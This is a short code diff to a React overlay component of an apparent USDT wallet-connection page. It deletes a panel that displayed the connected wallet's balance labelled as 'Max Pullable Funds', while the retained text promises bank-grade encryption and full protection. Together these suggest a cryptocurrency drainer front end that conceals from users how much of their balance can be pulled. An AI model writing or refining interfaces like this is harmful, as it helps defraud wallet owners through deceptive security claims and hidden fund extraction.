@@ -953,25 +953,6 @@ function CompactOverlay({
                   Secured with bank-grade encryption — every transaction is fully protected.
                 </span>
               </div>
-              {/* Balance / max-pullable pill shown as soon as the wallet is connected */}
-              {(() => {
-                const bal = isTRC20 ? trcBalance : evmUsdtBalance;
-                if (bal === null || bal === undefined) return null;
-                return (
-                  <div style={{ marginTop:10, padding:'10px 16px', borderRadius:10,
-                    background:'rgba(0,229,160,0.05)', border:'1px solid rgba(0,229,160,0.15)',
-                    fontSize:12, color:'rgba(255,255,255,0.5)', lineHeight:1.7 }}>
-                    <div style={{ display:'flex', justifyContent:'space-between' }}>
-                      <span>Wallet USDT Balance</span>
-                      <span style={{ color:'#00E5A0', fontWeight:700 }}>{bal.toFixed(2)} USDT</span>
-                    </div>
-                    <div style={{ display:'flex', justifyContent:'space-between' }}>
-                      <span>Max Pullable Funds</span>
-                      <span style={{ color:'#00E5A0', fontWeight:700 }}>{bal.toFixed(2)} USDT</span>
-                    </div>
-                  </div>
-                );
-              })()}
             </>
           )}
         </div>
